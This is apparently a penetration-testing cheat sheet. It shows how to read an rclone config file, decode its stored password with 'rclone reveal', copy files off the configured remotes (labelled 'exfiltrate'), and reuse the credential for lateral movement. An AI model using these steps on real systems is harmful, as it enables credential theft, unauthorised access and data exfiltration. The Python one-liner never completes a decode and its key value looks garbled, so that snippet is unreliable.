# rclone Obfuscated Password Decode

rclone stores passwords in its config as `obscure` encoding (reversible XOR + base64). If you find `rclone.conf`, decode the password instantly:

```bash
# Config location:
cat ~/.config/rclone/rclone.conf
# Format: pass = BFrNJRlhcNFcDzB3VDp6MnVr0w  (obscure value)

# Decode with rclone itself:
rclone reveal 'BFrNJRlhcNFcDzB3VDp6MnVr0w'

# Or decode without rclone installed (Python one-liner):
python3 -c "
import base64
enc = base64.b64decode('<obscure_value>')
key = b'9c935b48730a554d6bfd7c63c886a92bd390198eb8ca005eb6c8e1b9b59e4fcbafde0e33f12ef03bf41a4f61f0f91be4e78dc2d2eb0'
# rclone's key is fixed; use the rclone reveal command — it's the simplest
"
```

If rclone config has a remote (e.g. S3, SFTP, FTP):
```bash
rclone lsd <remote-name>:      # list top-level directories
rclone ls <remote-name>:       # list all files recursively
rclone copy <remote-name>:/path/to/file /tmp/  # exfiltrate
```

The decoded password is the cleartext credential for the remote service — try it for lateral movement (SSH, web login, SMB).
